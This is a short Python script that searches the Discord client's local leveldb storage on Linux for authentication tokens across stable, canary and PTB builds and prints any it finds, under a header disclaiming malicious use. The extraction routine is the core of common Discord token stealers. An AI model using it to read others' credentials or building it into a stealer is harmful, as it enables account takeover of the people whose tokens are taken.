# This script should only be used for personal purposes.
# Do NOT use this for malicious purposes

from typing import Literal
import os
import re

_PATHS = {"stable": "discord", "canary": "discordcanary", "ptb": "discordptb"}


def get_token(version: Literal["stable", "canary", "ptb"] = "stable"):
    path = os.path.join(os.path.expanduser("~/.config/"), _PATHS[version])
    if not os.path.isdir(path):
        return []

    tokens = []
    for db in os.listdir(f"{path}/Local Storage/leveldb"):
        if db.endswith(".ldb") or db.endswith(".log"):
            try:
                with open(f"{path}/Local Storage/leveldb/{db}", "rb") as file:
                    for token in re.findall(
                        r"token.*?\"([a-zA-z0-9]+\.[a-zA-z0-9]+\.[a-zA-z0-9]+)\"",
                        file.read().decode(errors="ignore"),
                    ):
                        if not token in tokens:
                            tokens.append(token)
            except PermissionError:
                continue

    return tokens


if __name__ == "__main__":
    for version in _PATHS:
        print(version, get_token(version), sep=": ")
